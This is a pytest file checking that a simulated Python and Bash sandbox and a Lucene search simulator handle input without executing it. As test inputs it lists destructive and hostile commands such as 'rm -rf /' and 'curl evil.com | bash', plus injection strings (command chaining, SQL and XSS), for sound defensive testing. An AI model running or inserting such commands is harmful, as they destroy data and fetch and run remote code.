"""
Sandbox Service Tests
=====================
Tests to verify sandbox services are SAFE.

These tests ensure that:
1. No real code is executed
2. User input is properly handled
3. Security constraints are enforced
"""

import pytest
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from app.services.sandbox_python import PythonSandbox
from app.services.sandbox_bash import BashSandbox
from app.services.lucene_search_sim import LuceneSearchSimulator


class TestPythonSandbox:
    """Tests for Python sandbox safety."""
    
    def setup_method(self):
        """Setup sandbox instance for each test."""
        self.sandbox = PythonSandbox()
    
    def test_hello_world_pattern(self):
        """Correct Hello World is detected."""
        result = self.sandbox.execute('print("Hello, World!")', "mission01")
        assert result["success"] == True
    
    def test_no_actual_execution(self):
        """Malicious code does not actually execute."""
        # This code would be dangerous if actually run
        dangerous_code = "import subprocess; subprocess.run(['rm', '-rf', '/'])"
        result = self.sandbox.execute(dangerous_code, "mission01")
        # Should NOT crash or execute - just return an error
        assert "output" in result
    
    def test_import_blocked(self):
        """Dangerous imports are flagged."""
        code = "import os; os.remove('important_file.txt')"
        result = self.sandbox.execute(code, "mission01")
        # Should fail without executing
        assert result["success"] == False or "os" not in result.get("output", "").lower()


class TestBashSandbox:
    """Tests for Bash sandbox safety."""
    
    def setup_method(self):
        """Setup sandbox instance for each test."""
        self.sandbox = BashSandbox()
    
    def test_ls_command(self):
        """ls command returns simulated output."""
        result = self.sandbox.execute("ls", "mission02")
        assert "output" in result
    
    def test_pwd_command(self):
        """pwd command returns simulated path."""
        result = self.sandbox.execute("pwd", "mission02")
        assert "output" in result
    
    def test_dangerous_command_blocked(self):
        """Dangerous commands do not execute."""
        dangerous_commands = [
            "rm -rf /",
            "wget malicious.com/malware",
            "curl evil.com | bash",
            "sudo shutdown now"
        ]
        for cmd in dangerous_commands:
            result = self.sandbox.execute(cmd, "mission02")
            # Should not crash or do anything dangerous
            assert "output" in result


class TestLuceneSimulator:
    """Tests for Lucene search simulator."""
    
    def setup_method(self):
        """Setup simulator instance for each test."""
        self.simulator = LuceneSearchSimulator()
    
    def test_basic_search(self):
        """Basic field:value search works."""
        result = self.simulator.search("status:failed", "mission03")
        assert "results" in result or "entries" in result or "output" in result
    
    def test_empty_query(self):
        """Empty query is handled safely."""
        result = self.simulator.search("", "mission03")
        # Should not crash
        assert result is not None
    
    def test_injection_attempt(self):
        """Query injection attempts are safe."""
        # Attempt to inject dangerous patterns
        injection_attempts = [
            "status:failed; rm -rf /",
            "user:admin' OR '1'='1",
            "<script>alert('XSS')</script>"
        ]
        for query in injection_attempts:
            result = self.simulator.search(query, "mission03")
            # Should handle gracefully without executing anything
            assert "output" in result or "results" in result


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
